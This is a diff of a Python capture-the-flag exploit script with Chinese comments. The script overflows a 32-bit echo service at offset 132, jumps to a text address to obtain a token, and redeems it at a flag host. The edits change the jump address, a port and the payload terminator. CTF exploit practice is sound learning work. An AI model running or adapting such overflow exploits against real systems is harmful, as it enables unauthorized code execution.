@@ -3,7 +3,7 @@
 """
 ret2text exploit —— 32 位 PE echo 服务，一条龙拿 flag
 ============================================================
-溢出 -> 跳 0x00416130 领一次性 token -> 自动访问 flag 靶机兑换 flag
+溢出 -> 跳 0x00401000 领一次性 token -> 自动访问 flag 靶机兑换 flag
 
 用法:  python a1.py          （直接跑，配置改下面两行）
        python a1.py -i       （运行时提示输入 token 靶机和 flag 靶机）
@@ -20,7 +20,7 @@ import urllib.request
 # ============================================================
 # 两个靶机地址（改成你自己的）
 TOKEN_HOST, TOKEN_PORT = "172.17.43.31", 9999
-FLAG_HOST,  FLAG_PORT  = "172.17.0.13",   11922
+FLAG_HOST,  FLAG_PORT  = "172.17.0.13",   13209
 
 OFFSET = 132 
 # ============================================================
@@ -69,7 +69,7 @@ def get_token(verbose=True):
         print("[>] _data   = %r" % (_data))
         print("[<] resp1   = %r" % resp1)
     
-    s.sendall(pl)
+    s.sendall(pl + b"\n")
     time.sleep(0.4)
     data = recv_all(s, 5.0)
     try:
